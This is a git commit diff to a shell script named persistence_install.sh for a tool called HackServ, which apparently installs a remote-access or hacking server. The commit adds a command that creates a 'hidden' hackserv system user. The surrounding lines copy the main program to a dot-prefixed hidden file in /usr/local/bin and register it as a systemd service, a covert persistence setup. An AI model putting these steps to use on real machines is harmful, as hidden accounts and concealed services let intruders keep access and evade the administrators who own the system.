d7ea6df5566c2bd42cdbdf5cfd818dc1b9f637bf
Stephen Harris <trackmastersteve@users.noreply.github.com>
2021-04-21 13:03:28 -0700

    Added command to create hidden hackserv user

--- persistence_install.sh
+++ persistence_install.sh
@@ -3,6 +3,7 @@
 # HackServ installer
 # install.sh
 #
+sudo useradd -s /bin/nologin hackserv
 sudo cp hackserv.py /usr/local/bin/.hackserv.py
 sudo cp hsConfig.py /usr/local/bin/hsConfig.py
 sudo cp hackserv.service /etc/systemd/system/hackserv.service
